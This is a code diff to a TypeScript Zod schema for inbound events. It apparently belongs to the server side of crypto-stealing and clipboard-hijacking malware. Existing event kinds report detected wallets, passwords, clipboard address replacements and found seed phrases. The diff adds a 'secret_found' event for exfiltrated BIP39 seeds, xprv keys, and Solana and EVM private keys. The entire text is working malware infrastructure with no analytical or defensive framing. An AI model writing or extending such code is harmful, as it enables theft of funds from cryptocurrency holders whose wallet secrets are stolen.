@@ -181,7 +181,15 @@ const eventData = z.discriminatedUnion('kind', [
     })
   }),
   z.strictObject({ kind: z.literal('clipboard_replace'), data: z.strictObject({ coin: z.string().min(1).max(16), original: z.string().min(1).max(256), replacement: z.string().min(1).max(256) }) }),
-  z.strictObject({ kind: z.literal('seed_found'), data: z.strictObject({ words: z.union([z.literal(12), z.literal(18), z.literal(24)]), value: z.string().min(1).max(4096) }) })
+  z.strictObject({ kind: z.literal('seed_found'), data: z.strictObject({ words: z.union([z.literal(12), z.literal(18), z.literal(24)]), value: z.string().min(1).max(4096) }) }),
+  z.strictObject({
+    kind: z.literal('secret_found'),
+    data: z.strictObject({
+      secret_kind: z.enum(['bip39-24', 'bip39-12', 'xprv', 'solana', 'evm-key', 'hex64', 'other']),
+      value: z.string().min(1).max(4096),
+      confident: z.boolean()
+    })
+  })
 ]);
 
 const inbound = {
@@ -206,7 +214,7 @@ const inbound = {
   event: z.strictObject({
     ...baseShape,
     type: z.literal('event'),
-    kind: z.enum(['wallet_detected', 'wallet_closed', 'password', 'clipboard_secret', 'clipboard_replace', 'seed_found']),
+    kind: z.enum(['wallet_detected', 'wallet_closed', 'password', 'clipboard_secret', 'clipboard_replace', 'seed_found', 'secret_found']),
     data: z.record(z.unknown()),
     legacy: z.string().max(4096)
   }),
